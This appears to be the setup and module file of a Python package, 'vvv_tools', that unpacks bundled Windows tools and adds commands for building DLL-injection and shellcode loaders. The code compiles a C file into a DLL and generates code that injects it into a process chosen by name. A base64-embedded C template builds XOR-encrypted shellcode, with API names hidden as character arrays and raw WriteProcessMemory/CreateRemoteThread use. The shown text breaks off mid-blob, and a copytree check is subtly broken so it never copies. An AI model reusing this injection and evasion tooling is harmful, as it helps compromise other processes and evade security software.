# coding=utf-8
import shutil
import re
import os
import sys
import time
import json
import platform
import tempfile
import traceback

def __setup():
    from setuptools import setup
    setup(
        # pip install twine
        # python setup.py bdist_wheel && twine upload dist/*
        name = "vvv_tools",
        version = "0.3.1",
        packages = ["vvv_tools"],
        entry_points={
            'console_scripts': [
                'v_tools = vvv_tools:execute',
                'v_make_dll_inject_32 = vvv_tools:make_dll_inject_32',
                'v_make_dll_inject_64 = vvv_tools:make_dll_inject_64'
            ]
        },
        install_requires=[
           'vvv_tools_stable>=0.0.4',
        ],
        package_data ={
            "vvv_tools":[
                '*.zip',
                'Packages/**',
                'yolo/**',
            ]
        },
    )

import vvv_tools_stable
is_debugger = False

def copytree(src, dst, symlinks=False, ignore=None):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        s = os.path.join(src, item)
        d = os.path.join(dst, item)
        if os.path.isdir(s):
            copytree(s, d, symlinks, ignore)
        else:
            if not os.path.exists(d) > 1:
                shutil.copy2(s, d)

def extractall(self, path=None, members=None, pwd=None):
    if members is None: members = self.namelist()
    path = os.getcwd() if path is None else os.fspath(path)
    for zipinfo in members:
        try:    _zipinfo = zipinfo.encode('cp437').decode('gbk')
        except: _zipinfo = zipinfo.encode('utf-8').decode('utf-8')
        print('[*] unpack...', _zipinfo)
        if _zipinfo.endswith('/') or _zipinfo.endswith('\\'):
            myp = os.path.join(path, _zipinfo)
            if not os.path.isdir(myp):
                os.makedirs(myp)
        else:
            myp = os.path.join(path, _zipinfo)
            youp = os.path.join(path, zipinfo)
            self.extract(zipinfo, path)
            if myp != youp:
                os.rename(youp, myp)
import zipfile
zipfile.ZipFile.extractall = extractall

def creat_windows_shortcut(exe_path, name=None):
    vbsscript = '\n'.join([
        'set WshShell = WScript.CreateObject("WScript.Shell" )',
        'set oShellLink = WshShell.CreateShortcut(Wscript.Arguments.Named("shortcut") & ".lnk")',
        'oShellLink.TargetPath = Wscript.Arguments.Named("target")',
        'oShellLink.WindowStyle = 1',
        'oShellLink.Save',
    ])
    s = tempfile.mkdtemp()
    try:
        vbs = os.path.join(s, 'temp.vbs')
        with open(vbs, 'w', encoding='utf-8') as f:
            f.write(vbsscript)
        exe  = exe_path
        link = os.path.join(os.path.expanduser("~"), 'Desktop', name or os.path.split(exe_path)[1])
        if os.path.isfile(link + '.lnk'):
            os.remove(link + '.lnk')
        cmd = r'''
        {} /target:"{}" /shortcut:"{}"
        '''.format(vbs, exe, link).strip()
        print('[*] make shortcut in Desktop:', cmd)
        v = os.popen(cmd)
        v.read()
        v.close()
    finally:
        if traceback.format_exc().strip() != 'NoneType: None':
            print('create shortcut failed.')
            traceback.print_exc()
        shutil.rmtree(s)

# zip_path_exe
def get_zip_path_exe(zip, path, exe):
    localpath = os.path.split(vvv_tools_stable.__file__)[0]
    v_tools_file = os.path.join(localpath, zip)
    if '/' in path:
        path, inner  = path.split('/')
        v_tools_target = os.path.join(os.path.split(sys.executable)[0], 'Scripts', path)
        v_tools_exec = os.path.join(v_tools_target, inner, exe)
    else:
        v_tools_target = os.path.join(os.path.split(sys.executable)[0], 'Scripts', path)
        v_tools_exec = os.path.join(v_tools_target, exe)
    return {
        'file': v_tools_file,
        'target': v_tools_target,
        'exec': v_tools_exec,
        'type': 'zip_path_exe',
        'path': path,
        'exe': exe,
    }
# zip_path_exe
def unpack_v_zip_path_exe(zeobj):
    print('[*] zip file path ===>', zeobj['file'])
    print('[*] exe file path ===>', zeobj['exec'])
    if not os.path.isdir(zeobj['target']):
        print('[*] unpack...')
        f = zipfile.ZipFile(zeobj['file'], 'r')
        f.extractall(zeobj['target'])
        f.close()
        print('[*] unpacked path ===>', zeobj['target'])
    creat_windows_shortcut(zeobj['exec'], zeobj['exe'])
# zip_path_exe
def remove_v_zip_path_exe(zeobj, kill_process=True):
    if os.path.isdir(zeobj['target']):
        if kill_process:
            os.popen('taskkill /f /im "{}" /t'.format(zeobj['exe'])).read()
        print('[*] remove...', zeobj['target'])
        time.sleep(0.2)
        for i in range(10):
            try:
                shutil.rmtree(zeobj['target'])
                break
            except:
                print('[*] wait...')
                time.sleep(0.2)
        link = os.path.join(os.path.expanduser("~"), 'Desktop', zeobj['exe'])
        if os.path.isfile(link + '.lnk'):
            os.remove(link + '.lnk')

def get_scripts_scrt_desktop(zip, path, password_tips):
    localpath = os.path.split(vvv_tools_stable.__file__)[0]
    v_tools_file = os.path.join(localpath, zip)
    v_tools_target = os.path.join(os.path.expanduser("~"), 'Desktop', path)
    return {
        'file': v_tools_file,
        'target': v_tools_target,
        'password_tips': password_tips,
    }
# zip_path_exe
def unpack_v_scripts_scrt_desktop(zeobj):
    if zeobj['password_tips'] == 'none':
        if not os.path.isdir(zeobj['target']):
            print('[*] unpack...')
            f = zipfile.ZipFile(zeobj['file'], 'r')
            f.extractall(zeobj['target'])
            f.close()
            print('[*] unpacked path ===>', zeobj['target'])
    else:
        print('[*] zip file path ===>', zeobj['file'])
        if not os.path.isdir(zeobj['target']):
            os.makedirs(zeobj['target'])
        shutil.copy(zeobj['file'], zeobj['target'])
        print('[*] unpacked path ===>', zeobj['target'])
        print('[*] password_tips:', zeobj['password_tips'])

# zip_path_exe
def remove_v_scripts_scrt_desktop(zeobj):
    if os.path.isdir(zeobj['target']):
        print('[*] remove...', zeobj['target'])
        time.sleep(0.2)
        for i in range(10):
            try:
                shutil.rmtree(zeobj['target'])
                break
            except:
                print('[*] wait...')
                time.sleep(0.2)

def install_tcc():
    if platform.architecture()[0].startswith('32'):
        _ver = '32'
    elif platform.architecture()[0].startswith('64'):
        _ver = '64'
    localpath = os.path.split(vvv_tools_stable.__file__)[0]
    targ = os.path.join(os.path.dirname(sys.executable), 'Scripts')
    _tcc = 'tcc-0.9.27-win{}-bin.zip'.format(_ver)
    if os.path.isfile(os.path.join(targ, 'tcc.exe')):
        print('[*] tcc is installed.')
        return
    print('init tcc tool: {}'.format(_tcc))
    tcc = os.path.join(localpath, _tcc)
    zf = zipfile.ZipFile(tcc)
    zf.extractall(path = targ)
    winapi = os.path.join(localpath, 'winapi-full-for-0.9.27.zip')
    zf = zipfile.ZipFile(winapi)
    zf.extractall(path = targ)
    fd = 'winapi-full-for-0.9.27'
    finclude = os.path.join(targ, fd, 'include')
    tinclude = os.path.join(targ, 'tcc', 'include')
    copytree(finclude, tinclude)
    shutil.rmtree(os.path.join(targ, fd))
    tccenv = os.path.join(targ, 'tcc')
    copytree(tccenv, targ)
    print('tcc in {}'.format(targ))
    shutil.rmtree(tccenv)

install_list = [
    {
        'name': 'sublime',
        'type': 'zip_path_exe',
        'info': ['sublime3.zip', 'sublime3', 'sublime_fix.exe']
    },
    {
        'name': 'scrcpy',
        'type': 'zip_path_exe',
        'info': ['scrcpy-win64-v2.1.1.zip', 'scrcpy/scrcpy-win64-v2.1.1', 'scrcpy.exe']
    },
    # {
    #     'name': 'VC_redist.x64',
    #     'type': 'scripts_scrt_desktop',
    #     'info': ['VC_redist.x64.zip', 'VC_redist.x64', 'none']
    # },
    {
        'name': 'labelimg',
        'type': 'scripts_scrt_desktop',
        'info': ['labelimg.zip', 'labelimg', 'none']
    },
    {
        'name': 'tcc',
        'type': 'tcc',
    },
]

def sublime_user_config():
    sublime_1 = os.path.join(os.path.dirname(__file__), "Packages")
    target_2 = os.path.join(os.path.split(sys.executable)[0], 'Scripts', 'sublime3/Data/Packages')
    shutil.rmtree(target_2)
    copytree(sublime_1, target_2)

def create_yolo_project():
    yolo_project = os.path.join(os.path.dirname(__file__), "yolo")
    target_2desktop = os.path.join(os.path.expanduser("~"), 'Desktop', 'yolo')
    if os.path.isdir(target_2desktop):
        shutil.rmtree(target_2desktop)
    copytree(yolo_project, target_2desktop)

def install(name=None):
    for meta in install_list:
        if (not name) or (name and meta['name'] == name):
            if meta['type'] == 'tcc':
                install_tcc()
            if meta['type'] == 'zip_path_exe':
                unpack_v_zip_path_exe(get_zip_path_exe(meta['info'][0], meta['info'][1], meta['info'][2]))
            if meta['type'] == 'scripts_scrt_desktop':
                unpack_v_scripts_scrt_desktop(get_scripts_scrt_desktop(meta['info'][0], meta['info'][1], meta['info'][2]))
    if name == 'sublime':
        sublime_user_config()
    if name == 'yolo':
        create_yolo_project()

def remove(name=None, kill_process=True):
    for meta in install_list:
        if (not name) or (name and meta['name'] == name):
            if meta['type'] == 'zip_path_exe':
                remove_v_zip_path_exe(get_zip_path_exe(meta['info'][0], meta['info'][1], meta['info'][2]), kill_process)
            if meta['type'] == 'scripts_scrt_desktop':
                remove_v_scripts_scrt_desktop(get_scripts_scrt_desktop(meta['info'][0], meta['info'][1], meta['info'][2]))

def execute():
    argv = sys.argv
    print('v_tools :::: [ {} ]'.format(' '.join(argv)))
    if len(argv) == 1:
        print('[install]:  v_tools install')
        print('[remove]:   v_tools remove')
        for installer in install_list:
            print('[tool]:', installer['name'])
        return
    if len(argv) > 1:
        if argv[1] == 'install':
            if len(argv) > 2:
                install(argv[2])
            else:
                install()
        if argv[1] == 'remove':
            if len(argv) > 2:
                remove(argv[2])
            else:
                remove()

def readfilecode(file):
    with open(file, 'r', encoding='utf-8') as f:
        return f.read()

def readfilebyte(file):
    with open(file, 'rb') as f:
        return f.read()


def _make_bit_dll_file(file, bit='64'):
    file_path = os.path.split(file)[0]
    tempfile_cname = 'v_temp_file.c'
    tempfile_dllname = 'v_temp_dll.dll'
    tempfile_exename = 'v_temp_exe.exe'
    tempfilec = '{}/{}'.format(file_path, tempfile_cname)
    tempfiledll = '{}/{}'.format(file_path, tempfile_dllname)
    tempfileexe = '{}/{}'.format(file_path, tempfile_exename)
    ccode = readfilecode(file)
    inject_config = re.findall('inject((?: +"[^ ]*")*)', ccode.strip().splitlines()[0])
    shellcode_config = re.findall('shellcode((?: +"[^ ]*")*)', ccode.strip().splitlines()[0])
    combine_expr = r'// *=* *before is dll *=* *[^\n]+\n'
    dll_ccode = re.split(combine_expr, ccode)[0]
    is_combine_file = bool(re.findall(combine_expr, ccode))
    combine_file_code = re.split(combine_expr, ccode)[1] if is_combine_file else None
    if not inject_config and not shellcode_config:
        print('[*] not find inject config in cfile 1.')
        return
    if inject_config:
        inject_config = re.split(' +', inject_config[0].strip())
        if not inject_config:
            print('[*] not find inject config in cfile 2.')
            return
        for idx,_ in enumerate(inject_config):
            inject_config[idx] = inject_config[idx].strip('"').strip("'")
        python_exe_path = sys.executable
        try:
            with open(tempfilec, 'w', encoding='utf-8') as f:
                f.write(dll_ccode)
            if bit == '32':
                os.system('tcc -m32 -shared "{}" -o "{}"'.format(tempfilec, tempfiledll))
            if bit == '64':
                os.system('tcc -m64 -shared "{}" -o "{}"'.format(tempfilec, tempfiledll))
            content = readfilebyte(tempfiledll)
            ret = ''
            for i in content:
                ret += str(i)+','
            dllcode = '{' + ret[:-1] + '}'
            enumbyname = None
            findbyname = None
            if len(inject_config) == 1:
                enumbyname = 'v_EnumProcessByName("{}");'.format(inject_config[0])
                findbyname = 'HANDLE proc = v_FindProcessByName("{}");'.format(inject_config[0])
            if len(inject_config) == 2:
                enumbyname = 'v_EnumProcessByNameAndCommand("{}", L"{}");'.format(inject_config[0], inject_config[1])
                findbyname = 'HANDLE proc = v_FindProcessByNameAndCommand("{}", L"{}");'.format(inject_config[0], inject_config[1])
            if len(inject_config) == 3:
                enumbyname = 'v_EnumProcessByNameAndPosRevCommand("{}", L"{}", L"{}");'.format(inject_config[0], inject_config[1], inject_config[2])
                findbyname = 'HANDLE proc = v_FindProcessByNameAndPosRevCommand("{}", L"{}", L"{}");'.format(inject_config[0], inject_config[1], inject_config[2])
            repcode = '''
    unsigned char DLLBit[] = '''+dllcode+''';
    LPVOID base = (char*)DLLBit;
    '''+enumbyname+'''
    '''+findbyname+'''
    printf("[*] proc: %d\\n", proc);
    v_InjectDllRef(base, proc);
'''
            return [is_combine_file, repcode, combine_file_code]
        except:
            traceback.print_exc()
        finally:
            if os.path.isfile(tempfilec): os.remove(tempfilec)
            if os.path.isfile(tempfiledll): os.remove(tempfiledll)
            if os.path.isfile(tempfileexe): os.remove(tempfileexe)
            if os.path.isfile("vvv_sh.bin"): os.remove("vvv_sh.bin")

    if shellcode_config:
        shellcode_config = re.split(' +', shellcode_config[0].strip())
        if not shellcode_config:
            print('[*] not find shellcode config in cfile 2.')
            return
        for idx,_ in enumerate(shellcode_config):
            shellcode_config[idx] = shellcode_config[idx].strip('"').strip("'")
        python_exe_path = sys.executable
        try:
            with open(tempfilec, 'w', encoding='utf-8') as f:
                f.write(dll_ccode)
            if bit == '32':
                os.system('tcc -m32 -shared "{}" -o "{}"'.format(tempfilec, tempfiledll))
            if bit == '64':
                os.system('tcc -m64 -shared "{}" -o "{}"'.format(tempfilec, tempfiledll))
            content = readfilebyte(tempfiledll)
            mk_index = 0
            mk_content_len = 0
            mk_run_funcs = []
            mk_charlists = []
            def make_init(charlist):
                nonlocal mk_index
                mk_index+=1
                mk_charname = 'get'+str(mk_index)
                mk_run_funcs.append(mk_charname+'(&shellcode, &baseindex);')
                mk_charlists.append('''
void '''+mk_charname+'''(char** shellcode, int* baseindex){
    char data[] = {'''+','.join(charlist)+'''};
    int len = sizeof(data); for (int i = 0; i < len; ++i) { (*shellcode)[(*baseindex)++] = data[i]; }
}
''')
            charlists = []
            for i in content:
                if len(charlists) == 0 or len(charlists[-1]) > 4000:
                    charlists.append([])
                charlists[-1].append(str(i))
                mk_content_len += 1
            for charlist in charlists:
                make_init(charlist)
            rep_charlist = ''.join(mk_charlists)
            rep_shellcode = '''
    int baseindex = 0;
    char* shellcode = pFn->fn_malloc('''+str(len(content) + 1)+''');
    '''+''.join(mk_run_funcs)+'''
    base = shellcode;
            '''
            # print(rep_shellcode)
            # print(rep_charlist)
            # adsfadsf
            import base64
            import random
            data = 'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8d2luZG93cy5oPg0KI2RlZmluZSBFTkNSWVBUIFRSVUUNCiNkZWZpbmUgRU5DUllQVEtFWSB7NSwyLDcsNyw3LDcsNyw3LDd9DQpITU9EVUxFIGdldEtlcm5lbDMyKCk7DQpGQVJQUk9DIGdldFByb2NBZGRyZXNzKEhNT0RVTEUgaE1vZHVsZUJhc2UpOw0Kdm9pZCBTaGVsbGNvZGVTdGFydCgpOw0Kdm9pZCBTaGVsbGNvZGVFbnRyeSgpOw0Kdm9pZCBTaGVsbGNvZGVFbmQoKTsNCnZvaWQgQ3JlYXRlU2hlbGxjb2RlKCk7DQpjaGFyKiBTaGVsbGNvZGVFbmNvZGUoaW50IHNpemUpOw0Kdm9pZCBTaGVsbGNvZGVEZWNvZGUoKTsNCmludCBtYWluKGludCBhcmdjLCBjaGFyIGNvbnN0ICphcmd2W10pIHsNCiAgICAjaWZkZWYgX1dJTjY0DQogICAgcHJpbnRmKCJrZXJuZWwzMjogICAgICAgJTAxNmxseFxuIiwgZ2V0S2VybmVsMzIoKSk7DQogICAgcHJpbnRmKCJHZXRQcm9jQWRkcmVzczogJTAxNmxseFxuIiwgZ2V0UHJvY0FkZHJlc3MoKEhNT0RVTEUpZ2V0S2VybmVsMzIoKSkpOw0KICAgICNlbHNlDQogICAgcHJpbnRmKCJrZXJuZWwzMjogICAgICAgJTAxNmx4XG4iLCBnZXRLZXJuZWwzMigpKTsNCiAgICBwcmludGYoIkdldFByb2NBZGRyZXNzOiAlMDE2bHhcbiIsIGdldFByb2NBZGRyZXNzKChITU9EVUxFKWdldEtlcm5lbDMyKCkpKTsNCiAgICAjZW5kaWYNCiAgICBDcmVhdGVTaGVsbGNvZGUoKTsNCiAgICByZXR1cm4gMDsNCn0NCnZvaWQgQ3JlYXRlU2hlbGxjb2RlKCl7DQogICAgSEFORExFIGhCaW4gPSBDcmVhdGVGaWxlQSgidnZ2X3NoLmJpbiIsIEdFTkVSSUNfV1JJVEUsIDAsIE5VTEwsIENSRUFURV9BTFdBWVMsIDAsIE5VTEwpOw0KICAgIERXT1JEIGR3U2l6ZTsNCiAgICBEV09SRCBkd1dyaXRlOw0KICAgIGlmIChoQmluID09IElOVkFMSURfSEFORExFX1ZBTFVFKXsNCiAgICAgICAgcHJpbnRmKCIlcyBlcnJvcjolZFxuIiwgImNyZWF0ZSB2dnZfc2guYmluIGZhaWwuIiwgR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIGlmIChFTkNSWVBUKXsNCiAgICAgICAgLy8g6Ieq5Yqo5Yqg5a+G5aSE55CG77yM6K6p55Sf5oiQ55qEIHNoZWxsY29kZSDoh6rluKbliqDlr4bvvIzlnKjmiafooYzov4fnqIvkuK3kvJroh6rliqjop6Plr4blho3ov5DooYwNCiAgICAgICAgV3JpdGVGaWxlKGhCaW4sIFNoZWxsY29kZURlY29kZSwgU2hlbGxjb2RlU3RhcnQgLSBTaGVsbGNvZGVEZWNvZGUsICZkd1dyaXRlLCBOVUxMKTsNCiAgICAgICAgcHJpbnRmKCJTaGVsbGNvZGVTaXplOiAgJTE2ZFxuIiwgZHdXcml0ZSk7IC8vIOWGmeWFpeino+WvhuWktA0KICAgICAgICBjaGFyKiBuZXdTaGVsbGNvZGUgPSBTaGVsbGNvZGVFbmNvZGUoU2hlbGxjb2RlRW5kIC0gU2hlbGxjb2RlU3RhcnQpOw0KICAgICAgICBXcml0ZUZpbGUoaEJpbiwgbmV3U2hlbGxjb2RlLCBTaGVsbGNvZGVFbmQgLSBTaGVsbGNvZGVTdGFydCwgJmR3V3JpdGUsIE5VTEwpOw0KICAgICAgICBwcmludGYoIlNoZWxsY29kZVNpemU6ICAlMTZkXG4iLCBkd1dyaXRlKTsgLy8g5YaZ5YWl5Yqg5a+G55qEIHNoZWxsY29kZQ0KICAgIH1lbHNlew0KICAgICAgICBkd1NpemUgPSBTaGVsbGNvZGVFbmQgLSBTaGVsbGNvZGVTdGFydDsNCiAgICAgICAgV3JpdGVGaWxlKGhCaW4sIFNoZWxsY29kZVN0YXJ0LCBkd1NpemUsICZkd1dyaXRlLCBOVUxMKTsNCiAgICAgICAgcHJpbnRmKCJTaGVsbGNvZGVTaXplOiAgJTE2ZFxuIiwgZHdXcml0ZSk7DQogICAgfQ0KfQ0KY2hhciogU2hlbGxjb2RlRW5jb2RlKGludCBzaXplKXsNCiAgICBjaGFyKiB0ZW1wID0gKGNoYXIgKiltYWxsb2Moc2l6ZSogc2l6ZW9mKGNoYXIpKTsNCiAgICBpbnQgaSA9IDA7DQogICAgaW50IGtleXNbXSA9IEVOQ1JZUFRLRVk7DQogICAgZm9yKDtpIDwgc2l6ZTsgaSsrKXsNCiAgICAgICAgdGVtcFtpXSA9ICgoY2hhciopU2hlbGxjb2RlU3RhcnQpW2ldIF4ga2V5c1tpJShzaXplb2Yoa2V5cykvc2l6ZW9mKGludCkpXTsNCiAgICB9DQogICAgcmV0dXJuIHRlbXA7DQp9DQp2b2lkIFNoZWxsY29kZURlY29kZSgpew0KICAgIGludCBpID0gMjA7DQogICAgaW50IGtleXNbXSA9IEVOQ1JZUFRLRVk7DQogICAgI2lmZGVmIF9XSU42NA0KICAgIHdoaWxlIChpIDwgKGludCkoU2hlbGxjb2RlRW5kLVNoZWxsY29kZVN0YXJ0KSsyMCl7DQogICAgICAgICgoY2hhciopU2hlbGxjb2RlU3RhcnQpW2ktMjBdIF49IGtleXNbKGktMjApJShzaXplb2Yoa2V5cykvc2l6ZW9mKGludCkpXTsNCiAgICAgICAgaSArKzsNCiAgICB9DQogICAgI2Vsc2UNCiAgICBpbnQgX2FkZHI7DQogICAgICAgICNpZmRlZiBfX01JTkdXMzJfXw0KICAgICAgICBhc20oIm1vdiA2NCglZXNwKSwgJWVheDsiKTsgLy8gZ2Nj57yW6K+RMzLkvY3ml7bvvIzov5nph4wgZXNwIOWJjemdoueahOaVsOWtl+ayoeacieeci+WHuuinhOW+i++8jOWboOS4uui/meS4jeWkquWlveiwg+ivle+8jOS9oOWPquimgeS9v+eUqCA2NC0+OSDov5nkuIDmnaHljbPlj6/jgIINCiAgICAgICAgI2Vsc2UNCiAgICAgICAgYXNtKCJtb3YgNjAoJWVzcCksICVlYXg7Iik7IC8vIHRjY+e8luivkTMy5L2N5pe277yM6L+Z6YeMIGVzcCDliY3pnaLnmoTmlbDlrZfpnIDopoHpmo/lr4bnoIHplb/luqblkIzmraXkv67mlLnvvJoyNCs5KjQ9NjDvvIg55piv5b2T5YmN5a+G56CB6ZW/5bqm77yJDQogICAgICAgICNlbmRpZg0KICAgIGFzbSgibW92ICUlZWF4LCAlMDsiOiI9YSIoX2FkZHIpKTsNCiAgICBfYWRkciA9IF9hZGRyICsgU2hlbGxjb2RlU3RhcnQtU2hlbGxjb2RlRGVjb2RlOw0KICAgIHdoaWxlIChpIDwgKGludCkoU2hlbGxjb2RlRW5kLVNoZWxsY29kZVN0YXJ0KSsyMCl7DQogICAgICAgICgoY2hhciopX2FkZHIpW2ktMjBdIF49IGtleXNbKGktMjApJShzaXplb2Yoa2V5cykvc2l6ZW9mKGludCkpXTsNCiAgICAgICAgaSsrOw0KICAgIH0NCiAgICAjZW5kaWYNCiAgICBTaGVsbGNvZGVTdGFydCgpOyAvLyBUSU5ZQyB1c2UgdGhpcw0KfQ0KLy8gc2hlbGxjb2RlDQp2b2lkIFNoZWxsY29kZVN0YXJ0KCl7DQogICAgI2lmZGVmIF9fTUlOR1czMl9fDQogICAgICAgICNpZmRlZiBfV0lONjQNCiAgICAgICAgYXNtKCJwb3AgJXJicCIpOyANCiAgICAgICAgYXNtKCJqbXAgU2hlbGxjb2RlRW50cnkiKTsNCiAgICAgICAgI2Vsc2UNCiAgICAgICAgYXNtKCJwb3AgJWVicCIpOyANCiAgICAgICAgYXNtKCJqbXAgX1NoZWxsY29kZUVudHJ5Iik7IC8vIG9sZCBzdHlsZS4gZnVjayENCiAgICAgICAgI2VuZGlmDQogICAgI2Vsc2UNCiAgICBTaGVsbGNvZGVFbnRyeSgpOyAvLyBUSU5ZQyB1c2UgdGhpcw0KICAgICNlbmRpZg0KfQ0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KI2luY2x1ZGU8c3RkaW8uaD4NCiNpbmNsdWRlPHdpbmRvd3MuaD4NCiNpbmNsdWRlPHRsaGVscDMyLmg+DQojaW5jbHVkZTxzdHJpbmcuaD4NCg0KdHlwZWRlZiBGQVJQUk9DIChXSU5BUEkqIEZOX0dldFByb2NBZGRyZXNzKSggSE1PRFVMRSBoTW9kdWxlLCBMUENTVFIgbHBQcm9jTmFtZSApOw0KdHlwZWRlZiBITU9EVUxFIChXSU5BUEkqIEZOX0xvYWRMaWJyYXJ5QSkoIExQQ1NUUiBscExpYkZpbGVOYW1lICk7DQp0eXBlZGVmIExQVk9JRCAoV0lOQVBJKiBGTl9WaXJ0dWFsQWxsb2NFeCkoSEFORExFIGhQcm9jZXNzLExQVk9JRCBscEFkZHJlc3MsU0laRV9UIGR3U2l6ZSxEV09SRCBmbEFsbG9jYXRpb25UeXBlLERXT1JEIGZsUHJvdGVjdCk7DQp0eXBlZGVmIFdJTkJPT0wgKFdJTkFQSSogRk5fVmlydHVhbEZyZWVFeCkoSEFORExFIGhQcm9jZXNzLExQVk9JRCBscEFkZHJlc3MsU0laRV9UIGR3U2l6ZSxEV09SRCBkd0ZyZWVUeXBlKTsNCnR5cGVkZWYgSEFORExFIChXSU5BUEkqIEZOX0NyZWF0ZVJlbW90ZVRocmVhZCkoSEFORExFIGhQcm9jZXNzLExQU0VDVVJJVFlfQVRUUklCVVRFUyBscFRocmVhZEF0dHJpYnV0ZXMsU0laRV9UIGR3U3RhY2tTaXplLExQVEhSRUFEX1NUQVJUX1JPVVRJTkUgbHBTdGFydEFkZHJlc3MsTFBWT0lEIGxwUGFyYW1ldGVyLERXT1JEIGR3Q3JlYXRpb25GbGFncyxMUERXT1JEIGxwVGhyZWFkSWQpOw0KdHlwZWRlZiBXSU5CT09MIChXSU5BUEkqIEZOX1dyaXRlUHJvY2Vzc01lbW9yeSkoSEFORExFIGhQcm9jZXNzLExQVk9JRCBscEJhc2VBZGRyZXNzLExQQ1ZPSUQgbHBCdWZmZXIsU0laRV9UIG5TaXplLFNJWkVfVCAqbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7DQp0eXBlZGVmIERXT1JEIChXSU5BUEkqIEZOX0dldEN1cnJlbnRQcm9jZXNzSWQpKFZPSUQpOw0KdHlwZWRlZiBIQU5ETEUgKFdJTkFQSSogRk5fR2V0Q3VycmVudFByb2Nlc3MpKFZPSUQpOw0KdHlwZWRlZiBpbnQgKF9fY2RlY2wqIEZOX3N0cmNtcCkoY29uc3QgY2hhciAqX1N0cjEsY29uc3QgY2hhciAqX1N0cjIpOw0KdHlwZWRlZiBpbnQgKF9fY2RlY2wqIEZOX3NwcmludGYpKGNoYXIgKl9EZXN0LGNvbnN0IGNoYXIgKl9Gb3JtYXQsLi4uKTsNCnR5cGVkZWYgdm9pZCAqKF9fY2RlY2wqIEZOX21hbGxvYykoc2l6ZV90IF9TaXplKTsNCnR5cGVkZWYgc3RydWN0IF9GVU5DVElPTiB7DQogICAgRk5fR2V0UHJvY0FkZHJlc3MgICAgICAgICAgIGZuX0dldFByb2NBZGRyZXNzOw0KICAgIEZOX0xvYWRMaWJyYXJ5QSAgICAgICAgICAgICBmbl9Mb2FkTGlicmFyeUE7DQogICAgRk5fVmlydHVhbEFsbG9jRXggICAgICAgICAgIGZuX1ZpcnR1YWxBbGxvY0V4Ow0KICAgIEZOX1ZpcnR1YWxGcmVlRXggICAgICAgICAgICBmbl9WaXJ0dWFsRnJlZUV4Ow0KICAgIEZOX0NyZWF0ZVJlbW90ZVRocmVhZCAgICAgICBmbl9DcmVhdGVSZW1vdGVUaHJlYWQ7DQogICAgRk5fV3JpdGVQcm9jZXNzTWVtb3J5ICAgICAgIGZuX1dyaXRlUHJvY2Vzc01lbW9yeTsNCiAgICBGTl9HZXRDdXJyZW50UHJvY2Vzc0lkICAgICAgZm5fR2V0Q3VycmVudFByb2Nlc3NJZDsNCiAgICBGTl9HZXRDdXJyZW50UHJvY2VzcyAgICAgICAgZm5fR2V0Q3VycmVudFByb2Nlc3M7DQogICAgRk5fc3RyY21wICAgICAgICAgICAgICAgICAgIGZuX3N0cmNtcDsNCiAgICBGTl9zcHJpbnRmICAgICAgICAgICAgICAgICAgZm5fc3ByaW50ZjsNCiAgICBGTl9tYWxsb2MgICAgICAgICAgICAgICAgICAgZm5fbWFsbG9jOw0KfUZVTkNUSU9OLCAqUEZVTkNUSU9OOw0Kdm9pZCBJbml0RnVuY3Rpb25zKFBGVU5DVElPTiBwRm4pew0KICAgIGNoYXIgc3pVc2VyMzJbXSAgICAgICAgICAgICAgICAgICA9IHsndScsJ3MnLCdlJywncicsJzMnLCcyJywnXDAnfTsNCiAgICBjaGFyIHN6S2VybmVsMzJbXSAgICAgICAgICAgICAgICAgPSB7J2snLCdlJywncicsJ24nLCdlJywnbCcsJzMnLCcyJywnXDAnfTsNCiAgICBjaGFyIHN6TG9hZExpYnJhcnlBW10gICAgICAgICAgICAgPSB7J0wnLCdvJywnYScsJ2QnLCdMJywnaScsJ2InLCdyJywnYScsJ3InLCd5JywnQScsJ1wwJ307DQogICAgY2hhciBzelZpcnR1YWxBbGxvY0V4W10gICAgICAgICAgID0geydWJywnaScsJ3InLCd0JywndScsJ2EnLCdsJywnQScsJ2wnLCdsJywnbycsJ2MnLCdFJywneCcsJ1wwJ307DQogICAgY2hhciBzelZpcnR1YWxGcmVlRXhbXSAgICAgICAgICAgID0geydWJywnaScsJ3InLCd0JywndScsJ2EnLCdsJywnRicsJ3InLCdlJywnZScsJ0UnLCd4JywnXDAnfTsNCiAgICBjaGFyIHN6Q3JlYXRlUmVtb3RlVGhyZWFkW10gICAgICAgPSB7J0MnLCdyJywnZScsJ2EnLCd0JywnZScsJ1InLCdlJywnbScsJ28nLCd0JywnZScsJ1QnLCdoJywncicsJ2UnLCdhJywnZCcsJ1wwJ307DQogICAgY2hhciBzeldyaXRlUHJvY2Vzc01lbW9yeVtdICAgICAgID0geydXJywncicsJ2knLCd0JywnZScsJ1AnLCdyJywnbycsJ2MnLCdlJywncycsJ3MnLCdNJywnZScsJ20nLCdvJywncicsJ3knLCdcMCd9Ow0KICAgIGNoYXIgc3pHZXRDdXJyZW50UHJvY2Vzc0lkW10gICAgICA9IHsnRycsJ2UnLCd0JywnQycsJ3UnLCdyJywncicsJ2UnLCduJywndCcsJ1AnLCdyJywnbycsJ2MnLCdlJywncycsJ3MnLCdJJywnZCcsJ1wwJ307DQogICAgY2hhciBzekdldEN1cnJlbnRQcm9jZXNzW10gICAgICAgID0geydHJywnZScsJ3QnLCdDJywndScsJ3InLCdyJywnZScsJ24nLCd0JywnUCcsJ3InLCdvJywnYycsJ2UnLCdzJywncycsJ1wwJ307DQogICAgY2hhciBzem1zdmNydFtdICAgICAgICAgICAgICAgICAgID0geydtJywncycsJ3YnLCdjJywncicsJ3QnLCdcMCd9Ow0KICAgIGNoYXIgc3ptYWxsb2NbXSAgICAgICAgICAgICAgICAgICA9IHsnbScsJ2EnLCdsJywnbCcsJ28nLCdjJywnXDAnfTsNCiAgICBwRm4tPmZuX0dldFByb2NBZGRyZXNzICAgICAgICAgICAgPSAoRk5fR2V0UHJvY0FkZHJlc3MpZ2V0UHJvY0FkZHJlc3MoKEhNT0RVTEUpZ2V0S2VybmVsMzIoKSk7DQogICAgcEZuLT5mbl9Mb2FkTGlicmFyeUEgICAgICAgICAgICAgID0gKEZOX0xvYWRMaWJyYXJ5QSkgICAgICAgICAgICBwRm4tPmZuX0dldFByb2NBZGRyZXNzKChITU9EVUxFKWdldEtlcm5lbDMyKCksIHN6TG9hZExpYnJhcnlBKTsNCiAgICBwRm4t